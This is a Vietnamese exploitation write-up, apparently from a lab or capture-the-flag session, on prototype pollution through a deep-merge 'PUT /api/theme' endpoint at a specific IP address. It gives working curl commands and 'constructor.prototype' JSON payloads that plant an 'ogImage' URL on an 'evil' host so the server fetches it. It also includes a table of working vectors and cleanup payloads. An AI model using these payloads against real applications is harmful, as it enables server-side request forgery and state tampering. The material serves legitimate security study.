# 02 — Prototype pollution qua deep-merge

## Entry point

`PUT /api/theme` deep-merge JSON người dùng vào profile. Merge implementation
không bảo vệ prototype chain.

## Xác nhận field `ogImage` bị chặn theo đúng schema

```bash
curl -b ck.txt -X PUT http://91.107.189.166:3000/api/theme \
  -H 'Content-Type: application/json' -d '{"bio":"x","ogImage":"http://evil/"}'
# → 400 Bad Request
```

Phiên sau này phát hiện tinh tế hơn: trên một số trạng thái, request trả 200
nhưng `ogImage` bị **strip** khỏi profile (response PUT không chứa nó, và fetch
không xảy ra). Kết luận giống nhau: không set được trực tiếp.

## Vector hoạt động: `constructor.prototype` ở top-level

```json
{"bio":"v7", "constructor": {"prototype": {"ogImage": "http://evil/og.png"}}}
```

→ HTTP 200. `ogImage` không nằm trong profile (own-property) nhưng trở thành
**property kế thừa trên `Object.prototype` toàn cục** — và media pipeline đọc
nó khi build preview:

```
GET /api/preview → fetch failed: getaddrinfo ETIMEOUT evil
```

Bằng chứng pipeline fetch phía server: `fetch failed: getaddrinfo` là lỗi
Node.js/undici.

## Sai lầm đáng nhớ: `__proto__` vs `constructor.prototype`

Phiên 1-2 (file `1.md`, `2.md`) ghi nhận `__proto__` top-level "hoạt động",
`constructor.prototype` "bị bỏ qua". Phiên 3 đào lại phát hiện **ngược lại**:

- `__proto__` top-level → bị chặn 400
- `constructor.prototype` → vector thật

Lý do các lần test `__proto__` "thành công": **prototype pollution là global
state** — Object.prototype bị pollute bởi request `constructor.prototype` từ
trước đó *trên cùng process*, mọi session đều kế thừa. Test `__proto__` sau đó
chỉ "hưởng khoán" trạng thái cũ.

### Bàiтест phương pháp rút ra

Mọi thử nghiệm pollution phải làm trên **nền sạch**:

```bash
# clean trước mỗi test
curl -b ck.txt -X PUT .../api/theme -H 'Content-Type: application/json' \
  -d '{"constructor":{"prototype":{"ogImage":null}}}'
```

và dùng **giá trị marker khác nhau mỗi lần** (URL khác nhau) — kết quả đọc được
từ preview phải nhắc đúng URL mới thì vector mới thực sự ăn.

## Map vector đầy đủ (test differential trên nền sạch)

| Vector | Kết quả |
|---|---|
| `{"constructor":{"prototype":{...}}}` top-level | ✅ **EAT** (vector chính) |
| `{"links":{"constructor":{"prototype":{...}}}}` | ✅ **EAT** |
| `{"links":[{"constructor":{"prototype":{...}}}]}` (phần tử array) | ✅ **EAT** |
| `{"__proto__":{...}}` top-level | ❌ 400 |
| `{"constructor":{"constructor":{...}}}` | ❌ DEAD |
| `{"constructor":{"prototype":{"__proto__":{...}}}}` (2 tầng) | ❌ DEAD |
| `{"accent":{"constructor":{...}}}` | ❌ DEAD |
| `{"links":{"a":{"__proto__":{...}}}}` (lồng sâu) | ❌ DEAD |

`links` và phần tử của `links` cũng là object thường → merge đệ quy xuống đó
cũng pollute được. Điều này vô hại về mặt exploit (cùng đích Object.prototype)
nhưng quan trọng khi phân tích scope của merge function.

## Cleanup / thao túng state

```bash
# xóa pollution (deep-merge null)
-d '{"constructor":{"prototype":{"ogImage":null}}}'   # → "no og:image set"
# giá trị falsy khác bị fetch theo kiểu string
-d '{"constructor":{"prototype":{"ogImage":false}}}'  # → "refused to fetch false"
```

## Tại sao pollution tồn tại

Deep-merge kiểu đệ quy: `for key in src: if isObject(dst[key]) && isObject(src[key]) → recurse else dst[key] = src[key]`.
Với key `constructor`, `dst.constructor` là `Object.constructor` = `Function`,
`Function.prototype` là object → đệ quy xuống và ghi `ogImage` vào
`Function.prototype`? Không — kiểm chứng thực tế: đích cuối là
**Object.prototype** (mọi object thường kế thừa). Cách app viết merge xác định
chính xác path nào ăn; ở đây chỉ cần biết: `constructor.prototype` top-level
pollute được, và media pipeline đọc `ogImage` bằng property lookup thường
(`profile.ogImage`) nên property kế thừa cũng thành URL fetch.
